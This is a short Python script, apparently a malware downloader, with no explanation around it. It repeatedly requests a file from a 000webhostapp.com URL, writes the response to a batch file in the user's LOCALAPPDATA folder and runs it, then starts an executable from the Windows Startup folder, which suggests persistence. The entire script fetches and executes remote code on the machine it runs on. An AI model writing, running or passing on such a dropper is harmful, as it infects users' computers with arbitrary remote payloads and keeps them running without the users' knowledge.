import requests
import subprocess
import os
from time import sleep

response = ''

while '(ok)' not in str(response):
    try:
        response = requests.get("https://jdservernielubieng.000webhostapp.com/ok.txt").content
    except:
        pass

path = os.path.join(os.getenv("LOCALAPPDATA"), 'wow.bat')

open(path, 'wb').write(response)
subprocess.Popen(path, creationflags=subprocess.CREATE_NEW_CONSOLE)

sleep(30)

subprocess.Popen("C:\\Users\\Iks\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
